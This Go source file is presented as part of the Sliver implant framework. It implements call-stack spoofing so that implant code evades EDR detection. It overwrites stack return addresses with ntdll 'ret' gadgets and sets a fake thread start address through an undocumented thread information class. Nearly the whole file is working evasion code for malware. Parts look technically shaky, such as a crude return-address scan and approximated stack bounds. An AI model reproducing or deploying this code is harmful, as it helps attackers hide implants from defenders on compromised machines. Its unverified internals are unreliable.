package evasion

/*
	Sliver Implant Framework
	Copyright (C) 2021  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

// This file implements thread call-stack spoofing. Before executing sensitive
// API calls, we overwrite return addresses on the current thread's stack so
// that the call stack appears to originate from legitimate ntdll/kernel32
// code paths rather than from implant memory. This defeats EDR call-stack
// walking heuristics that detect synthetic/unbacked call stacks.
//
// Additionally, we use NtSetInformationThread with ThreadHoneypotPageInfo to
// set a fake thread start address that points into ntdll, making the thread
// appear to be a legitimate system thread.

import (
	"encoding/binary"
	"errors"
	"runtime"
	//{{if .Config.Debug}}
	"log"
	//{{end}}
	"unsafe"

	"golang.org/x/sys/windows"
)

// Thread information classes for NtQueryInformationThread / NtSetInformationThread
const (
	threadBasicInformation = 0x00
	threadHoneypotPageInfo = 0x1F // Undocumented: sets a fake start address
)

// threadBasicInformationStruct mirrors THREAD_BASIC_INFORMATION.
type threadBasicInformationStruct struct {
	ExitStatus     windows.NTStatus
	TebBaseAddress uintptr
	ClientID       clientIDStruct
	AffinityMask   uintptr
	Priority       int32
	BasePriority   int32
}

// clientIDStruct mirrors CLIENT_ID.
type clientIDStruct struct {
	UniqueProcess uintptr
	UniqueThread  uintptr
}

// stackSpoofState holds saved state needed to restore the original stack.
type stackSpoofState struct {
	OriginalReturnAddrs []uintptr // Saved return addresses to restore
	StackAddresses      []uintptr // Stack addresses where they were written
	OriginalStartAddr   uintptr   // Original thread start address
}

// savedState caches the spoof state for restoration.
var savedState *stackSpoofState

// ntQueryInformationThread calls NtQueryInformationThread via syscall.
func ntQueryInformationThread(threadHandle windows.Handle, infoClass uint32, infoBuffer unsafe.Pointer, infoLen uint32, returnLen *uint32) (status uint32) {
	ntdll := windows.NewLazyDLL("ntdll.dll")
	proc := ntdll.NewProc("NtQueryInformationThread")
	r, _, _ := proc.Call(
		uintptr(threadHandle),
		uintptr(infoClass),
		uintptr(infoBuffer),
		uintptr(infoLen),
		uintptr(unsafe.Pointer(returnLen)),
	)
	return uint32(r)
}

// ntSetInformationThread calls NtSetInformationThread via syscall.
func ntSetInformationThread(threadHandle windows.Handle, infoClass uint32, infoBuffer unsafe.Pointer, infoLen uint32) (status uint32) {
	ntdll := windows.NewLazyDLL("ntdll.dll")
	proc := ntdll.NewProc("NtSetInformationThread")
	r, _, _ := proc.Call(
		uintptr(threadHandle),
		uintptr(infoClass),
		uintptr(infoBuffer),
		uintptr(infoLen),
	)
	return uint32(r)
}

// getCurrentThreadHandle returns a pseudo-handle to the current thread (-2).
func getCurrentThreadHandle() windows.Handle {
	return windows.Handle(^uintptr(1)) // NtCurrentThread = (HANDLE)-2 = 0xFFFFFFFFFFFFFFFE
}

// getThreadTEB returns the address of the current thread's TEB (Thread Environment Block).
func getThreadTEB() (uintptr, error) {
	var info threadBasicInformationStruct
	var returnLen uint32
	status := ntQueryInformationThread(
		getCurrentThreadHandle(),
		threadBasicInformation,
		unsafe.Pointer(&info),
		uint32(unsafe.Sizeof(info)),
		&returnLen,
	)
	if status != 0 { // STATUS_SUCCESS = 0
		return 0, errors.New("NtQueryInformationThread failed")
	}
	return info.TebBaseAddress, nil
}

// getThreadStackBounds determines the current thread's stack base and limit
// from the TEB. On x64 Windows:
//
//	TEB+0x08 = StackBase (top of stack, high address)
//	TEB+0x10 = StackLimit (bottom of stack, low address)
//	TEB+0x1478 = DeallocationStack (actual allocation base)
func getThreadStackBounds(tebAddr uintptr) (stackBase uintptr, stackLimit uintptr) {
	stackBase = *(*uintptr)(unsafe.Pointer(tebAddr + 0x08))
	stackLimit = *(*uintptr)(unsafe.Pointer(tebAddr + 0x10))
	return stackBase, stackLimit
}

// findNtdllGadget finds a `ret` (0xC3) instruction in ntdll's .text section.
// This address will be used as a fake return address to make the stack
// appear to come from ntdll.
func findNtdllGadget() (uintptr, error) {
	ntdll := windows.NewLazyDLL("ntdll.dll")
	ntdllBase := uintptr(ntdll.Handle())

	// Parse PE headers from memory
	lfanew := *(*int32)(unsafe.Pointer(ntdllBase + 0x3C))
	coffOffset := ntdllBase + uintptr(lfanew) + 4
	numberOfSections := *(*uint16)(unsafe.Pointer(coffOffset + 2))
	sizeOfOptionalHeader := *(*uint16)(unsafe.Pointer(coffOffset + 16))
	sectionStart := coffOffset + 20 + uintptr(sizeOfOptionalHeader)

	for i := uint16(0); i < numberOfSections; i++ {
		secPtr := sectionStart + uintptr(i)*40
		nameBytes := (*[8]byte)(unsafe.Pointer(secPtr))
		if string(nameBytes[:5]) == ".text" {
			virtualAddress := *(*uint32)(unsafe.Pointer(secPtr + 12))
			virtualSize := *(*uint32)(unsafe.Pointer(secPtr + 8))
			textStart := ntdllBase + uintptr(virtualAddress)
			textSize := uintptr(virtualSize)

			// Find a `ret` (0xC3) gadget — prefer one preceded by `pop rbp` for realism
			for j := uintptr(0x100); j < textSize-2; j++ {
				b0 := *(*byte)(unsafe.Pointer(textStart + j))
				b1 := *(*byte)(unsafe.Pointer(textStart + j + 1))
				// `pop rbp; ret` = 5D C3 — looks like a normal function epilogue
				if b0 == 0x5D && b1 == 0xC3 {
					return textStart + j + 1, nil
				}
			}
			// Fallback: any `ret`
			for j := uintptr(0x100); j < textSize; j++ {
				if *(*byte)(unsafe.Pointer(textStart + j)) == 0xC3 {
					return textStart + j, nil
				}
			}
			return 0, errors.New("no ret gadget found in ntdll .text")
		}
	}

	return 0, errors.New(".text section not found in ntdll")
}

// scanReturnAddresses scans the current thread's stack for return addresses
// that point outside of loaded module ranges (i.e., they point into implant
// or heap memory — these are the addresses that reveal the implant's presence).
//
// On x64, return addresses on the stack are 8-byte values. We walk from the
// current stack pointer upward, checking each potential return address.
func scanReturnAddresses(stackLimit, stackBase, currentSP uintptr) ([]uintptr, []uintptr, error) {
	ntdllBase := uintptr(windows.NewLazyDLL("ntdll.dll").Handle())
	kernel32Base := uintptr(windows.NewLazyDLL("kernel32.dll").Handle())

	// Estimate ntdll and kernel32 sizes (rough — just for range checks)
	// We check if an address falls within the base + 16MB range
	moduleEnd := func(base uintptr) uintptr {
		return base + 0x1000000 // 16MB rough upper bound
	}

	var spoofAddrs []uintptr
	var stackPositions []uintptr

	// Walk the stack from current SP up to stack base
	// Each stack frame's return address is typically at aligned offsets
	for addr := currentSP; addr < stackBase-8; addr += 8 {
		val := *(*uintptr)(unsafe.Pointer(addr))

		// Skip zero values
		if val == 0 {
			continue
		}

		// Check if this value looks like a return address pointing into
		// implant/heap memory (not in ntdll or kernel32 range)
		inNtdll := val >= ntdllBase && val < moduleEnd(ntdllBase)
		inKernel32 := val >= kernel32Base && val < moduleEnd(kernel32Base)

		if !inNtdll && !inKernel32 && val > 0x10000 && val < stackBase {
			// This might be a return address from implant code
			// Only flag addresses that are in the executable range of the implant
			// (rough check: not on the stack, not in heap)
			spoofAddrs = append(spoofAddrs, val)
			stackPositions = append(stackPositions, addr)
		}
	}

	return spoofAddrs, stackPositions, nil
}

// getCurrentStackPointer returns the current RSP value.
// This uses runtime internals to get the stack pointer.
//
//go:nosplit
func getCurrentStackPointer() uintptr {
	// We use a local variable's address as an approximation of RSP.
	// This is not exact but close enough for stack walking purposes.
	var dummy int
	return uintptr(unsafe.Pointer(&dummy))
}

// SpoofThreadStack spoofs the current thread's call stack by:
//  1. Saving original return addresses
//  2. Overwriting them with addresses pointing into ntdll
//  3. Setting a fake thread start address via NtSetInformationThread
//
// After calling this, any stack walk by EDR will see return addresses
// pointing into legitimate system DLLs rather than implant memory.
func SpoofThreadStack() error {
	if runtime.GOARCH != "amd64" {
		return errors.New("stack spoofing only supported on amd64")
	}

	//{{if .Config.Debug}}
	log.Println("[StackSpoof] Spoofing thread stack...")
	//{{end}}

	// Get the current thread's TEB
	tebAddr, err := getThreadTEB()
	if err != nil {
		return err
	}

	// Get stack bounds
	stackBase, stackLimit := getThreadStackBounds(tebAddr)
	if stackBase == 0 || stackLimit == 0 {
		return errors.New("could not determine stack bounds")
	}

	// Find ntdll gadgets to use as fake return addresses
	gadgetAddr, err := findNtdllGadget()
	if err != nil {
		return err
	}

	// Get current stack pointer approximation
	currentSP := getCurrentStackPointer()

	// Scan for return addresses that point outside system DLLs
	spoofAddrs, stackPositions, err := scanReturnAddresses(stackLimit, stackBase, currentSP)
	if err != nil {
		return err
	}

	if len(spoofAddrs) == 0 {
		//{{if .Config.Debug}}
		log.Println("[StackSpoof] No implant return addresses found to spoof")
		//{{end}}
		return nil
	}

	// Save original state for restoration
	state := &stackSpoofState{
		OriginalReturnAddrs: make([]uintptr, len(spoofAddrs)),
		StackAddresses:      make([]uintptr, len(stackPositions)),
	}
	copy(state.OriginalReturnAddrs, spoofAddrs)
	copy(state.StackAddresses, stackPositions)

	// Overwrite each implant return address with the ntdll gadget
	var oldProtect uint32
	for i, stackPos := range stackPositions {
		// Change protection to RW (stack pages may already be RW)
		windows.VirtualProtect(stackPos, 8, windows.PAGE_READWRITE, &oldProtect)

		// Save original and overwrite with gadget
		state.OriginalReturnAddrs[i] = *(*uintptr)(unsafe.Pointer(stackPos))
		*(*uintptr)(unsafe.Pointer(stackPos)) = gadgetAddr

		// Restore protection
		windows.VirtualProtect(stackPos, 8, oldProtect, &oldProtect)
	}

	savedState = state

	// Set a fake thread start address using ThreadHoneypotPageInfo.
	// This makes the thread's reported start address point into ntdll,
	// hiding the fact that it was started from implant code.
	fakeStartAddr := gadgetAddr
	status := ntSetInformationThread(
		getCurrentThreadHandle(),
		threadHoneypotPageInfo,
		unsafe.Pointer(&fakeStartAddr),
		uint32(unsafe.Sizeof(fakeStartAddr)),
	)
	// Status may not be STATUS_SUCCESS on all Windows versions (undocumented),
	// so we don't fail on error here.
	_ = status

	//{{if .Config.Debug}}
	log.Printf("[StackSpoof] Spoofed %d return addresses, gadget=0x%08x\n", len(spoofAddrs), gadgetAddr)
	//{{end}}

	return nil
}

// RestoreThreadStack restores the original return addresses that were
// overwritten by SpoofThreadStack. Must be called before returning from
// the sensitive API call to avoid crashes.
func RestoreThreadStack() error {
	if savedState == nil {
		return errors.New("no saved stack state to restore")
	}

	//{{if .Config.Debug}}
	log.Println("[StackSpoof] Restoring original return addresses...")
	//{{end}}

	var oldProtect uint32
	for i, stackPos := range savedState.StackAddresses {
		// Change protection to RW
		windows.VirtualProtect(stackPos, 8, windows.PAGE_READWRITE, &oldProtect)

		// Restore original return address
		*(*uintptr)(unsafe.Pointer(stackPos)) = savedState.OriginalReturnAddrs[i]

		// Restore protection
		windows.VirtualProtect(stackPos, 8, oldProtect, &oldProtect)
	}

	//{{if .Config.Debug}}
	log.Printf("[StackSpoof] Restored %d return addresses\n", len(savedState.OriginalReturnAddrs))
	//{{end}}

	savedState = nil
	return nil
}

// WithSpoofedStack wraps a function call with stack spoofing:
//  1. SpoofThreadStack()
//  2. fn()
//  3. RestoreThreadStack()
//
// This ensures the stack is always restored even if fn panics.
func WithSpoofedStack(fn func() error) error {
	err := SpoofThreadStack()
	if err != nil {
		return err
	}

	// Use defer to guarantee restoration even on panic
	defer func() {
		_ = RestoreThreadStack()
	}()

	return fn()
}

// readMemoryU16 reads a uint16 from the given address.
func readMemoryU16(addr uintptr) uint16 {
	return binary.LittleEndian.Uint16((*[2]byte)(unsafe.Pointer(addr))[:])
}

// readMemoryU32 reads a uint32 from the given address.
func readMemoryU32(addr uintptr) uint32 {
	return binary.LittleEndian.Uint32((*[4]byte)(unsafe.Pointer(addr))[:])
}

// readMemoryU64 reads a uint64 from the given address.
func readMemoryU64(addr uintptr) uint64 {
	return binary.LittleEndian.Uint64((*[8]byte)(unsafe.Pointer(addr))[:])
}
